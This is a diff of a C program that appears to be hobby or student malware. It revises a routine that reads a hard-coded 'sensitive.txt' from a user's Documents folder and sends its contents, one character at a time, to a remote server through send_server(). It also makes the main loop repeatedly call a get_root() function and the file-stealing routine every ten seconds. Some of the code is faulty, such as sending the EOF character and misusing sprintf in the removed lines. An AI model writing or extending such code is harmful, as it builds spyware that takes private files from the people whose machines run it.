@@ -70,29 +70,31 @@ int get_root(void)
     return 0;
 }
 
-/* Get sensitive file data */
+/* Get sensitive file data
+Source: https://www.geeksforgeeks.org/c-program-to-read-contents-of-whole-file/ */
 int get_file_data() {
 
     // read file data into variable with absolute path    
-    char file_path = sprintf("/home/%s/Documents/sensitive.txt", getenv("USERPROFILE"));
-    FILE* ptr = fopen(file_path, "r");
+    //char *file_path = sprintf("/home/%s/Documents/sensitive.txt", getenv("USERPROFILE"));
+    FILE* ptr = fopen("/home/debian/Documents/sensitive.txt", "r");
     if (ptr == NULL) {
         printf("no such file.");
         return 0;
     }
  
-    /* Assuming that test.txt has content
-       in below format
-    NAME AGE CITY
-    abc     12 hyderbad
-    bef     25 delhi
-    cce     65 bangalore */
-    char buf[100];
-    while (fscanf(ptr, "%*s %*s %s ", buf) == 1)
-    {
-        char message = sprintf("%s", buf);
-        send_server(message);
-    }
+    // Printing what is written in file
+    // character by character using loop.
+    char ch;
+    do {
+        ch = fgetc(ptr);
+        printf("%c", ch);
+        send_server(&ch);
+ 
+        // Checking if character is not EOF.
+        // If it is EOF stop reading.
+    } while (ch != EOF);
+
+    fclose(ptr);
 
     return 0;
 }
@@ -102,10 +104,10 @@ int main(int argc, char *argv[])
 
     while(1)
     {
-        sleep(10);
-        test_connection();
+        //test_connection();
         get_root();
         get_file_data();
+        sleep(10);
     }
 
     return 0;
